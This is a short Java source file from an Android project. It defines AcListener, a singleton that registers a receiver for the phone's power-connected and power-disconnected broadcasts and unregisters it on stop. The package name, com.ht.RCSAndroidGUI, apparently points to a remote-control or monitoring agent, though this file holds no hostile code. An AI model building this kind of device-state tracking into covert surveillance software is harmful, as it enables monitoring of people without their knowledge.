package com.ht.RCSAndroidGUI.listener;

import android.content.Intent;
import android.content.IntentFilter;

import com.ht.RCSAndroidGUI.Ac;
import com.ht.RCSAndroidGUI.Status;

public class AcListener extends Listener<Ac> {
	/** The Constant TAG. */
	private static final String TAG = "AcListener";

	private AcBroadcastMonitor acReceiver;

	/** The singleton. */
	private volatile static AcListener singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static AcListener self() {
		if (singleton == null) {
			synchronized (AcListener.class) {
				if (singleton == null) {
					singleton = new AcListener();
				}
			}
		}

		return singleton;
	}
	
	@Override
	protected void start() {
		registerAc();
	}

	@Override
	protected void stop() {
		Status.getAppContext().unregisterReceiver(acReceiver);
	}
	
	/**
	 * Register Power Connected/Disconnected.
	 */
	private void registerAc() {
		acReceiver = new AcBroadcastMonitor();
		
		final IntentFilter filterOn = new IntentFilter(Intent.ACTION_POWER_CONNECTED);
		final IntentFilter filterOff = new IntentFilter(Intent.ACTION_POWER_DISCONNECTED);
		
		// Register the broadcastreceiver and filter it to only get power status changes
		Status.getAppContext().registerReceiver(acReceiver, filterOn);
		Status.getAppContext().registerReceiver(acReceiver, filterOff);
	}
}
